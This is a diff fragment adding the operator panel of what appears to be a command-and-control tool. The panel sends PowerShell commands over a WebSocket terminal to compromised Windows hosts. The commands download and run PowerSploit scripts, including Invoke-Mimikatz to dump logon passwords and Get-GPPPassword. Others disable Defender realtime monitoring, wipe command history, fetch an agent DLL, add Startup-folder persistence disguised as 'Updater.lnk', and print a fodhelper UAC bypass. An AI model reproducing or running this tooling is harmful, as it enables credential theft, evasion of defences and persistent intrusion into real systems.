+            powerup: ["$u=\"" + baseUrl + "/payloads/PowerSploit/Privesc/PowerUp.ps1?key=" + key + "\"", "IEX(New-Object Net.WebClient).DownloadString($u)"],
+            allchecks: "$o=Join-Path $env:TEMP 'allchecks_results.txt'; Invoke-AllChecks 2>$null | Out-File $o -Encoding UTF8; Write-Host '[+] AllChecks complete. Results saved to:' $o -ForegroundColor Green",
+            whoami: "whoami /all",
+            privs: "whoami /priv",
+            sysinfo: "systeminfo | Select-String \"OS Name|OS Version|System Type|Domain|Logon Server\"",
+            network: "ipconfig /all; netstat -ano | Select-String \"ESTABLISHED|LISTENING\" | Select-Object -First 20",
+            processes: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 | Format-Table Id, ProcessName, CPU, WorkingSet -AutoSize",
+            services: "Get-Service | Where-Object {$_.Status -eq \"Running\"} | Format-Table Name, DisplayName, Status -AutoSize",
+            defender: "Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host \"[+] Defender Realtime OFF\" -ForegroundColor Red",
+            powerview: "IEX(New-Object Net.WebClient).DownloadString(\"" + baseUrl + "/payloads/PowerSploit/Recon/PowerView.ps1?key=" + key + "\"); Get-Domain; Get-DomainController",
+            mimikatz: "IEX(New-Object Net.WebClient).DownloadString(\"" + baseUrl + "/payloads/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1?key=" + key + "\"); Invoke-Mimikatz -Command \"sekurlsa::logonpasswords\"",
+            creds: "cmdkey /list",
+            gpp: "IEX(New-Object Net.WebClient).DownloadString(\"" + baseUrl + "/payloads/PowerSploit/Exfiltration/Get-GPPPassword.ps1?key=" + key + "\"); Get-GPPPassword",
+            cleanhist: "Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -EA SilentlyContinue; Clear-History; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); Set-PSReadLineOption -HistorySaveStyle SaveNothing; Write-Host '[+] History cleared' -ForegroundColor Green",
+            addpersist: "$su=[Environment]::GetFolderPath('Startup');$ag='" + baseUrl + "/payloads/rust_agent.dll?key=" + key + "';$dp=Join-Path $su 'svc.exe';IWR $ag -OutFile $dp;$ws=New-Object -ComObject WScript.Shell;$sc=$ws.CreateShortcut((Join-Path $su 'Updater.lnk'));$sc.TargetPath='rundll32.exe';$sc.Arguments=\"$dp,Start\";$sc.WindowStyle=7;$sc.Save();Write-Host '[+] Persistence added to Startup' -ForegroundColor Green",
+            getdll: "IWR '" + baseUrl + "/payloads/rust_agent.dll?key=" + key + "' -OutFile (Join-Path $env:TEMP 'agent.dll'); Write-Host '[+] DLL saved to' (Join-Path $env:TEMP 'agent.dll') -ForegroundColor Green",
+            uacbypass: "Write-Host '[*] UAC Bypass (fodhelper):' -ForegroundColor Yellow; Write-Host 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d \"rundll32.exe %TEMP%\\agent.dll,Start\" /f'; Write-Host 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f'; Write-Host 'fodhelper.exe'; Write-Host 'reg delete HKCU\\Software\\Classes\\ms-settings /f'",
+            readprivesc: "$f=Join-Path $env:TEMP 'privesc_results.txt'; Write-Host \"`n====== PRIVESC RESULTS ======`n\" -ForegroundColor Cyan; if(Test-Path $f){Get-Content $f -Encoding UTF8 -Raw}else{Write-Host '[!] No privesc results. Run PrivEsc scan first!' -ForegroundColor Red}",
+            readallchecks: "$f=Join-Path $env:TEMP 'allchecks_results.txt'; Write-Host \"`n====== ALLCHECKS RESULTS ======`n\" -ForegroundColor Cyan; if(Test-Path $f){Get-Content $f -Encoding UTF8 -Raw}else{Write-Host '[!] No allchecks results. Run AllChecks first!' -ForegroundColor Red}",
+            readall: "$p=Join-Path $env:TEMP 'privesc_results.txt'; $a=Join-Path $env:TEMP 'allchecks_results.txt'; Write-Host \"`n====== ALL SCAN RESULTS ======`n\" -ForegroundColor Cyan; Write-Host \"`n--- PRIVESC ---`n\" -ForegroundColor Yellow; if(Test-Path $p){Get-Content $p -Encoding UTF8 -Raw}else{Write-Host '[!] No privesc'}; Write-Host \"`n--- ALLCHECKS ---`n\" -ForegroundColor Yellow; if(Test-Path $a){Get-Content $a -Encoding UTF8 -Raw}else{Write-Host '[!] No allchecks'}",
+            clear: "Clear-Host",
+        };
+    }
+    
+    let ptyExecLock = false;
+    function ptyExec(cmdKey) {
+        if (ptyExecLock) return;
+        const cmds = getPtyReconCmds();
+        const cmd = cmds[cmdKey];
+        if (!cmd) return;
+        if (ptyWs && ptyWs.readyState === WebSocket.OPEN) {
+            ptyExecLock = true;
+            if (Array.isArray(cmd)) {
+                cmd.forEach((line, i) => {
+                    setTimeout(() => ptyWs.send(line + "\r"), i * 800);
+                });
+                setTimeout(() => { ptyExecLock = false; }, cmd.length * 800 + 200);
+            } else {
+                // Clear current line first to avoid duplicates, then send command
+                ptyWs.send("\x1b[2K\r" + cmd + "\r");
+                setTimeout(() => { ptyExecLock = false; }, 500);
+            }
+        } else {
+            alert("PTY not connected!");
+        }
+    }
+
+    
+    </script>
+</body>
+</html>
